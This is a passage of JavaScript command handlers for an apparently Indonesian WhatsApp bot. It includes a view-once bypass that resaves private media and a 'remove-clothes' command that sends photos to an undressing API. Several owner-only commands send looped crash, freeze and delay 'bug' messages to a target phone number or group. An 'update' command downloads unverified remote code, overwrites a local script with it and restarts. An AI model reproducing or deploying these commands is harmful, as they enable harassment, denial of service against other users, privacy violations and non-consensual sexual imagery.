 if (parts.length < 3) {
 return Reply('Format salah! Gunakan:\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai');
 }

 const [time, battery, ...messageParts] = parts;
 const message = messageParts.join('|').trim();

 if (!time || !battery || !message) {
 return Reply('Format tidak lengkap! Pastikan mengisi jam, batre, dan pesan');
 }

 await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 const encodedTime = encodeURIComponent(time);
 const encodedMessage = encodeURIComponent(message);
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodedMessage}&emojiStyle=apple`;

 const response = await axios.get(url, { responseType: 'arraybuffer' });

 if (!response.data) {
 throw new Error('Gagal mendapatkan gambar dari server');
 }

 await client.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '𝘗𝘰𝘸𝘦𝘳𝘥 𝘉𝘺 𝘗𝘪𝘯𝘻𝘺 | 𝘓𝘶𝘯𝘰𝘹'
 }, { quoted: m });

 await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

 } catch (error) {
 console.error('Error di iqc:', error);
 Reply(`❌ Error: ${error.message || 'Terjadi kesalahan saat memproses'}`);
 }
}
break;

case 'rvo':
case 'readviewonce': {
  await reaction(m.chat, "⏳")

  const msg = m.quoted;
  if (!msg) return reply('⚠️ Harap reply ke pesan media view once-nya.');

  // deteksi tipe pesan
  let type = msg.mtype;

  // kalau view once, buka isi dalamnya
  if (type === 'viewOnceMessageV2' || type === 'viewOnceMessage') {
    const inner = msg.msg || msg.message;
    if (inner?.imageMessage) {
      type = 'imageMessage';
      msg.msg = inner;
    } else if (inner?.videoMessage) {
      type = 'videoMessage';
      msg.msg = inner;
    } else if (inner?.audioMessage) {
      type = 'audioMessage';
      msg.msg = inner;
    }
  }

  const kind =
    type === 'imageMessage' ? 'image' :
    type === 'videoMessage' ? 'video' :
    type === 'audioMessage' ? 'audio' : null;

  if (!kind) return reply('❌ Jenis pesan tidak didukung. Gunakan hanya untuk gambar, video, atau audio.');

  // ===== Helper =====
  const pad = (n) => n.toString().padStart(2, '0');
  const formatBytes = (n) => {
    if (!n && n !== 0) return '-';
    const units = ['B','KB','MB','GB','TB'];
    let i = 0, v = Number(n);
    while (v >= 1024 && i < units.length - 1) { v /= 1024; i++; }
    return `${v.toFixed(v >= 10 ? 0 : 1)} ${units[i]}`;
  };
  const formatDuration = (sec) => {
    if (!sec && sec !== 0) return '-';
    const h = Math.floor(sec / 3600);
    const mnt = Math.floor((sec % 3600) / 60);
    const s = Math.floor(sec % 60);
    return h ? `${h}:${pad(mnt)}:${pad(s)}` : `${mnt}:${pad(s)}`;
  };
  const formatDateID = (d = new Date()) => {
    const opts = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
                   hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Jakarta' };
    return new Intl.DateTimeFormat('id-ID', opts).format(d) + ' WIB';
  };
  const safe = (v) => (v === undefined || v === null || v === '' ? '-' : String(v));

  // ambil metadata grup
  let groupMeta = null;
  let groupLine = 'Private Chat';
  try {
    if (m.isGroup) {
      groupMeta = await client.groupMetadata(m.chat);
      groupLine = `${safe(groupMeta.subject)} (${groupMeta.participants?.length || 0} member)`;
    }
  } catch {}

  const senderJid = msg?.sender || msg?.key?.participant || m?.sender || '-';
  const senderName = msg?.pushName || m?.pushName || senderJid?.split('@')[0] || '-';

  // ambil properti media
  const im = msg?.msg?.imageMessage;
  const vm = msg?.msg?.videoMessage;
  const am = msg?.msg?.audioMessage;
  const base = (kind === 'image' ? im : kind === 'video' ? vm : am) || {};

  const mime = base.mimetype || '-';
  const size = base.fileLength || base.fileLengthLow || base.mediaKeyTimestamp || null;
  const seconds = base.seconds || base.pttDuration || base.audioLength || null;
  const width  = base.width  || base.jpegThumbnailWidth  || null;
  const height = base.height || base.jpegThumbnailHeight || null;
  const sha256 = base?.fileSha256 ? Buffer.from(base.fileSha256, 'base64').toString('hex') : null;

  try {
    // download ulang media
    const stream = await downloadContentFromMessage(msg, kind);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const captionOri = msg.caption || '';
    const lines = [
      '𝘗𝘰𝘸𝘦𝘳𝘥 𝘉𝘺 𝘗𝘐𝘕𝘡𝘠 | 𝘓𝘜𝘕𝘖𝘟',
    ];
    const detailCaption = lines.join('\n');

    // kirim media + caption detail
    const sendOptions = { quoted: m };
    if (kind === 'image') {
      await client.sendMessage(m.chat, { image: buffer, caption: detailCaption }, sendOptions);
    } else if (kind === 'video') {
      await client.sendMessage(m.chat, { video: buffer, caption: detailCaption }, sendOptions);
    } else if (kind === 'audio') {
      await client.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg', ptt: true, caption: detailCaption }, sendOptions);
    }
    
    await reaction(m.chat, "✅");
    return reply(`Type : *${kind.toUpperCase()}*\nViewOnce Berhasil Diproses.`);
  } catch (err) {
    console.error('rvo-safe error:', err);
    return reply('❌ Gagal memproses media. Coba lagi atau kirim ulang tanpa kompresi.');
  }
}
break;

case 'report': {
  await reaction(m.chat, "⏳");

  let teks = `📢 *LAPORAN FITUR ERROR*\n\n`
  teks += `👤 *Pelapor:* $@${m.sender.split('@')[0]}\n`
  teks += `💬 *Pesan:* ${text}\n`
  teks += `📅 *Waktu:* ${new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })}`

await client.sendMessage(config.owner, {
  text: teks,
  mentions: [m.sender]
}, { quoted: m })
  reply('✅ sudah dikirim ke owner. Terima kasih!')
}
break

const fs = require('fs');
const axios = require('axios');

case 'update':
try {

    await reaction(m.chat, "⏳");
    await m.reply("🔍 Mengecek update terbaru...");

    const axios = require("axios");
    const fs = require("fs");

    // URL RAW GitHub
    const url = "https://raw.githubusercontent.com/PinzyOffc/LunoxUpdate/main/justinoffc.js";

    // File lokal
    const filePath = "./justinoffc.js";

    // Ambil file dari GitHub
    const res = await axios.get(url);
    const githubCode = res.data;

    // Ambil file lokal
    let localCode = "";

    if (fs.existsSync(filePath)) {
        localCode = fs.readFileSync(filePath, "utf8");
    }

    // Bandingkan isi
    if (githubCode === localCode) {

        await reaction(m.chat, "✅");
        return m.reply("✔️ Script sudah versi terbaru.");

    }

    // Kalau beda → update
    fs.writeFileSync(filePath, githubCode);

    await reaction(m.chat, "✅");
    await m.reply("✅ Update berhasil!\n🔁 Restart bot...");

    setTimeout(() => {
        process.exit(0);
    }, 1500);

} catch (err) {

    console.error(err);

    await reaction(m.chat, "❌");
    await m.reply("❌ Gagal mengecek update.");

}

break;

case 'terlanjang': {
    try {
        if (!m.quoted && !text) {
            return reply("Balas foto atau kirim URL setelah command .terlanjang");
        }

        reply("⌭ Memproses gambar...");

        let imageUrl;

        if (m.quoted && /image/.test(m.quoted.mimetype)) {
            const media = await m.quoted.download();
            
            const uploaded = await uploadImage(media);
            imageUrl = uploaded;
        } 

        else if (text) {
            imageUrl = text;
        }

        if (!imageUrl) {
            return reply("Gagal mengambil gambar.");
        }

        const res = await fetch(
            `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
        );

        const data = await res.json();
        const hasil = data.result || null

        if (!hasil) {
            return reply("Gagal memproses gambar.");
        }

        await sock.sendMessage(m.chat, {
            image: { url: hasil },
            caption:
`⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙇𝙐𝙉𝙊𝙓 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pushname}
⎙ Gambar berhasil diproses`
        });

    } catch (e) {
        console.log(e);
        reply("Terjadi kesalahan saat memproses gambar.");
    }
}
break;
				
case "afk": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = true
await reaction(m.chat, "✅")
m.reply('*Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Owner Offline*')
}
break;

case "unafk": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = false
await reaction(m.chat, "✅")
m.reply('*Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Owner Online*')
}
break;
//CASE CRASH ONE MESSAGE
case 'fc-hard':
case 'forclose-call': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 3; i++) {
await forcloselunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : fc calling"))
            }
            break;

//CASE FORCE ONE MESSAGE
case 'blank-hard': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 3; i++) {
await blankhardlunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : blank hard"))
            }
            break;
            
                            
//CASE BUG FC QUIZ
case 'delay-sw': {
if (!isOwner) return reply(config.message.owner); 
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 5; i++) {
await delayhardlunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : delay sw hard"))
            }
            break;                         
                                
//CASE BUG CRASH SPAM
case 'blank-stuck': {
if (!isOwner) return reply(config.message.owner);
if (!q) return reply(`— ex: ${prefix + command} 62`);
    
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`);
if (jidx.length < 10) return reply(`nomor tidak valid!`);
    
let target = `${jidx}@s.whatsapp.net`;
reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 8; i++) {
await blankhardlunox(target);
                }
                
console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : blank stuck logo"))
            }
            break;            

//CASE BUG IN PLACE
case 'hallo':
case 'p': {
await reaction(m.chat, "⏳")
if (!isOwner) return reply(config.message.owner); 
let target = m.chat;

reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
for (let i = 0; i < 5; i++) {
 try {
   await forcloselunox(target);
   
   } catch (err) {
                
     console.log("Error:", err.message);
     break;

   }
     
}

console.log(chalk.red.bold(`🩸success mengirim bug ke ${target}`))
            }
            break;
				
//CASE BUG GRUP FC           		
case 'combo-gb': {
    await reaction(m.chat, "🕛")
    await sleep(1000);
    await reaction(m.chat, "🕞")
    await sleep(1000);
    await reaction(m.chat, "🕖")
    await sleep(1000);
    await reaction(m.chat, "🕛")
    await sleep(1000);
    await reaction(m.chat, "✅")
                if (!isOwner) return reply(config.message.owner);
                if (!isGroup) return reply(`Ketiknya Didalam Group Bego`);   
                let jidx = q.replace(/[^0-9]/g, "");
                if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `)             
                let target = `${m.chat}`;
                reply(`success! sent bug to ${target}\n\n*Note* : Jika Bug Tidak Terkirim Kecilkan Lop Agar Tidak Overload.`);              
                for (let i = 0; i < 5; i++) {
                    await groubattackxnxx(target);
                }
            console.log(chalk.red.bold("🩸Success Mengirim Bug FC Kedalam Grup"))
            }
            break;
            
//CASE BUG GRUP DELAY       
case 'delay-gb': {
    await reaction(m.chat, "🕛")
    await sleep(1000);
    await reaction(m.chat, "🕞")
    await sleep(1000);
    await reaction(m.chat, "🕖")
    await sleep(1000);
    await reaction(m.chat, "🕛")
    await sleep(1000);
    await reaction(m.chat, "✅")
                if (!isOwner) return reply(config.message.owner);
                if (!isGroup) return reply(`Ketiknya Didalam Group Bego`);   
                let jidx = q.replace(/[^0-9]/g, "");
                if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `)             
                let target = `${m.chat}`;
                reply(`success! sent bug to ${target}\n\n*Note* : Jika Bug Tidak Terkirim Kecilkan Lop Agar Tidak Overload.`);              
                for (let i = 0; i < 5; i++) {
                    await groubattackxnxx(target);
                }
            console.log(chalk.red.bold("🩸Success Mengirim Bug Delay Kedalam Grup"))
            }
            break;                
            default:
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
